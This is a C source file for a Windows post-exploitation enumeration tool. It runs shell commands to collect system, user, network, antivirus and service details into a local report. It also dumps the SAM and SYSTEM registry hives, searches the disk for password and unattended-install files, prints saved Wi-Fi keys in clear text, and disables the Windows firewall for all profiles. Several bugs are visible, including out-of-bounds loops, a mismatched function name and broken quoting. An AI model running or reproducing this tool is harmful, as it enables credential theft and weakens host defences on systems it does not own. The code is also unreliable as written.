#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <conio.h>
#include "database.h"
#include <string.h>


int time_c();
char dir_file();
char User_Enum();
char  route_network();
char Password_get();
char INFO_random();


char dir_file()
{
    char * log  = "=================================================\n"
                  "              + Windows Enumeration +            \n"
                  "=================================================\n"
                  " + Windows Version and Configuration + \n"
                  "=====================================\n\n";
    char info [6][150] = {
                    PATH  " systeminfo | findstr /B /C:OS",
                    PATH  " wmic os get osarchitecture",
                    PATH  " Get-ChildItem Env: || ft Key,Value",
                    PATH  " wmic logicaldisk get caption,description,providername,Size",
                    PATH  " wmic qfe",
                    PATH  " systeminfo"
                    };
          fprintf(file,"%s",log);
          printf("%s",log);
          for (int i =0 ;i<=6 ;i++){
             if (!file) abort();
             if ((ptr = popen(info[i], "r")) != NULL){
                  while ((fgets(buf,BUFSIZ,ptr) != NULL)){
                       fprintf(file,"%s", buf);
                       printf("%s",buf);
                  }
             }

              printf("\n%s\n",end);fprintf(file,"%s\n",end);
              if (i==0){
                  fprintf(file,"%s",L0);printf(L0);
                }
              if (i==1){
                   fprintf(file,"%s",L1);printf(L1);
                 }
              if (i==2){
                   fprintf(file,"%s",L2);printf(L2);
                 }
              if (i==3){
                   fprintf(file,"%s",L3);printf(L3);
                 }
              if (i==4){
                 fprintf(file,"%s",L30);printf(L30);
              }
              if(i==5)
              	break ;
         }
  }
char User_Enmu()
  {
      char * log  = "\n=================================================\n"
                    "               + User  Enumeration +               \n"
                    "===================================================\n"
                    " + Get current username + \n"
                    "=============================\n";
      char info [8][200] = {
                      PATH  " $env:username",
                      PATH  " WHOAMI /PRIV /FO TABLE",
                      PATH  " net user",
                      PATH  " Get-ChildItem C:\\Users -Force || select Name",
                      PATH  " net accounts",
                      PATH  " net user administrator",
                      PATH  " net user %USERNAME%",
                      PATH  " net localgroup administrators"
                      };
            fprintf(file,"%s",log);
            printf("%s",log);
            for (int i =0 ;i<=8 ;i++){
               if (!file) abort();
               if ((ptr = popen(info[i], "r")) != NULL){
                    while ((fgets(buf,BUFSIZ,ptr) != NULL)){
                         fprintf(file,"%s", buf);
                         printf("%s",buf);
                    }
               }
                printf("\n%s\n",end);fprintf(file,"%s\n",end);
                if (i==0){
                    fprintf(file,"%s",L4);printf(L4);
                  }
                if (i==1){
                    fprintf(file,"%s",L5);printf(L5);
                  }
                if (i==2){
                    fprintf(file,"%s",L6);printf(L6);
                  }
                if (i==3){
                    fprintf(file,"%s",L7);printf(L7);
                  }
                if (i==4){
                    fprintf(file,"%s",L8);printf(L8);
                  }
                if (i==5){
                   fprintf(file,"%s",L9);printf(L9);
                 }
                if (i==6){
                    fprintf(file,"%s",L10);printf(L10);
                  }
                if (i==7)
                   break;
           }
    }
char route_network()
{
      char * log  = "\n=================================================\n"
                    "               + Network Enumeration +             \n"
                    "===================================================\n"
                    " + IP Configuration + \n"
                    "=============================\n";
      char info [9][200] = {
                        PATH  " ipconfig /all",
                        PATH  " route print",
                        PATH  " Get-NetNeighbor -AddressFamily IPv4 || ft ifIndex,IPAddress,LinkLayerAddress,State",
                        PATH  " netstat -ano",
                        PATH  " netsh firewall show config",
                        PATH  " netsh advfirewall set allprofiles state off",
                        PATH  " reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s",
                        PATH  " net share",
                        PATH  " type %WINDIR%\\System32\\drivers\\etc\\hosts"
                       
                        };
              fprintf(file,"%s",log);
              printf("%s",log);
              for (int i =0 ;i<=9 ;i++){
                 if (!file) abort();
                 if ((ptr = popen(info[i], "r")) != NULL){
                      while ((fgets(buf,BUFSIZ,ptr) != NULL)){
                           fprintf(file,"%s", buf);
                           printf("%s",buf);
                      }
                 }
                  printf("\n%s\n",end);fprintf(file,"%s\n",end);
                  if (i==0){
                      fprintf(file,"%s",L11);printf(L11);
                    }
                  if (i==1){
                      fprintf(file,"%s",L12);printf(L12);
                    }
                  if (i==2){
                      fprintf(file,"%s",L13);printf(L13);
                    }
                  if (i==3){
                       fprintf(file,"%s",L14);printf(L14);
                    }
                  if (i==4){
                      fprintf(file,"%s",L15);printf(L15);
                    }
                  if (i==5){
                      fprintf(file,"%s",L16);printf(L16);
                    }
                  if (i==6){
                      fprintf(file,"%s",L17);printf(L17);
                    }
                  if (i==7){
                      fprintf(file,"%s",L18);printf(L18);
                    }
                  if (i==8)
                     break;
             }
}
char Password_get()

{    

          char * log  = "\n=================================================\n"
                    "               + Password Enumeration +            \n"
                    "===================================================\n"
                    " + Get Sam File & System + \n"
                    "=============================\n"
                    "Note\n=======\nA required privilege is not held by the clien\n";
                     if(".\\sam"){  
                     		remove(".\\sam");
                     		remove(".\\system");                   	
                     	}           
             char info [4][BUFSIZ] = {
                                 PATH " reg save hklm\\sam .\\sam & reg save hklm\\system .\\system",
                                 " cd C:\\ & findstr /SI /M ""password"" *.xml *.ini *.txt",
                                 PATH " dir //s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul",
                                 "echo. & for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"')\
                                 do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\"\
                                 | find /v \"Number\" & echo.) & @echo on"
                                 };
                     
				      fprintf(file,"%s",log);
				             printf("%s",log);
				      for (int i =0 ;i<=5 ;i++){
				                  if (!file) abort();
				                  if ((ptr = popen(info[i], "r")) != NULL){
				                      while ((fgets(buf,BUFSIZ,ptr) != NULL)){
				                         fprintf(file,"%s", buf);
				                          printf("%s",buf);
				                      }
				                  }
				                  printf("\n%s\n",end);fprintf(file,"%s\n",end);
				                  if (i==0 ){
				                  	  fprintf(file,"%s",L19);printf(L19);
				                     }
				                  if (i==1){
				                        fprintf(file,"%s",L20);printf(L20);
				                    }
				                 if (i==2){
				                          fprintf(file,"%s",L21);printf(L21);
				                      }
				                if (i==3)
				                     break;
				        }
}				        

char INFO_random()
{
      char * log  = "\n=================================================\n"
                    "     + AV,Files,service & Procces Enumeration +    \n"
                    "===================================================\n"
                    " + AntivirusProduct + \n"
                    "=============================\n";
      char info [8][BUFSIZ] = {
                         PATH " CimInstance -Namespace root/SecurityCenter2 -Classname AntiVirusProduct",
                         PATH  " DRIVERQUERY",
                               " sc.exe qc usosvc",
                         PATH  " Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' || ft Parent,Name,LastWriteTime",
                               " wmic service list brief",
                               " tasklist",
                               " wmic startup get caption,command,Location",
                         PATH  " Get-ScheduledTask || where {$_.TaskPath -notlike \"\\Microsoft*\"} ||ft TaskName,TaskPath,State"
                        };
              fprintf(file,"%s",log);
              printf("%s",log);
              for (int i =0 ;i<=8 ;i++){
                 if (!file) abort();
                 if ((ptr = popen(info[i], "r")) != NULL){
                      while ((fgets(buf,BUFSIZ,ptr) != NULL)){
                           fprintf(file,"%s", buf);
                           printf("%s",buf);
                      }
                 }
                  printf("\n%s\n",end);fprintf(file,"%s\n",end);
                  if (i==0){
                      fprintf(file,"%s",L22);printf(L22);
                    }
                  if (i==1){
                      fprintf(file,"%s",L23);printf(L23);
                    }
                  if (i==2){
                      fprintf(file,"%s",L24);printf(L24);
                    }
                  if (i==3){
                       fprintf(file,"%s",L25);printf(L25);
                    }
                  if (i==4){
                      fprintf(file,"%s",L26);printf(L26);
                    }
                  if (i==5){
                     fprintf(file,"%s",L27);printf(L27);
                    }
                  if (i==6){
                     fprintf(file,"%s",L28);printf(L28);
                    }  
                  if (i==7)
                     break;
             }

      pclose(ptr);
      fclose(file);
      return 0;
}
int time_c(){
       time_t timeNow;
       timeNow = time(NULL);
       char *TIMENOW= (ctime(&timeNow));
       file = fopen("./Enum_Win.txt", "w+");
       fprintf(file,"%s\n", line0);
       fprintf(file,"%s","Currant Time&Date : ");
       fprintf(file,"%s", TIMENOW);
       printf("%s\nCurrent Time&Date : %s",line0, TIMENOW);
}
int main(){
    time_c();
    dir_file();
    User_Enmu();
    route_network();
    Password_get();
    INFO_random();

    return 0 ;
}
